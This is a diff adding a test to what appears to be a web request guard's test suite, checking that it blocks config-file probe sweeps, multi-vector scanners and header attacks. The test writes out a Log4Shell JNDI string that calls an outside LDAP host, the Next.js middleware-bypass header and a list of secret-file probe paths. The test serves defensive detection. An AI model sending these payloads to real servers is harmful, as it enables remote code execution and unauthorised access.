@@ -239,3 +239,27 @@ test("the relay keeps only the bans a tunnel without address checks keeps too", 
   assert.deepEqual(g.edge().banned.length, 4);
   assert.deepEqual(g.edge({ openTunnels: true }).banned.sort(), ["198.51.100.2", "198.51.100.4"]);
 });
+
+test("behaviour: a sweep through probes on an app that answers 200 to everything, many kinds of attack, headers", () => {
+  const { g } = guard();
+  const ip = "198.51.100.77";
+  const probes = ["/config.json", "/settings.json", "/composer.json", "/package.json", "/Dockerfile", "/swagger.json", "/aws-exports.js", "/runtime-config.js", "/env.js"];
+  let r = null;
+  for (const p of probes) { const info = { method: "GET", path: p, ua: "Mozilla/5.0" }; r = g.gate(ip, info) || r; g.after(ip, info, { status: 200 }); }
+  assert.ok(r, "the sweep is stopped even though every answer was 200");
+  assert.ok(g.scores.get(ip)?.payloads >= 1 || g.bans.has(ip), "and counted against the address");
+  // one address, four kinds of attack in a minute
+  const { g: g2 } = guard();
+  const ip2 = "203.0.113.78";
+  let last = null;
+  for (const p of ["/wp-login.php", "/cgi-bin/x", "/config.json", "/hystrix.stream"]) { const info = { method: "GET", path: p, ua: "Mozilla/5.0" }; g2.gate(ip2, info); last = info._bw; }
+  assert.ok(g2.behav.get(ip2).cats.size >= 4);
+  assert.equal(last.sig, "multi-vector", "four kinds of probing in a minute is one scanner");
+  // an attack that only shows in a header (Aegis passes them as info.headers)
+  const { g: g3 } = guard();
+  const d = g3.gate("203.0.113.79", { method: "GET", path: "/", ua: "Mozilla/5.0", headers: { "x-api-version": "${jndi:ldap://203.0.113.9/a}" } });
+  assert.equal(d?.status, 404, "a Log4Shell header is dropped");
+  const n = g3.gate("203.0.113.80", { method: "GET", path: "/admin", ua: "Mozilla/5.0", headers: { "x-middleware-subrequest": "middleware:middleware:middleware" } });
+  assert.equal(n?.status, 404, "the Next.js middleware bypass is dropped");
+  assert.equal(g3.gate("203.0.113.81", { method: "GET", path: "/", ua: "Mozilla/5.0", headers: { cookie: "cart={\"items\":[1,2]}; _ga=GA1.2.3.4", "x-forwarded-for": "198.51.100.1, 203.0.113.2" } }), null, "ordinary headers pass");
+});
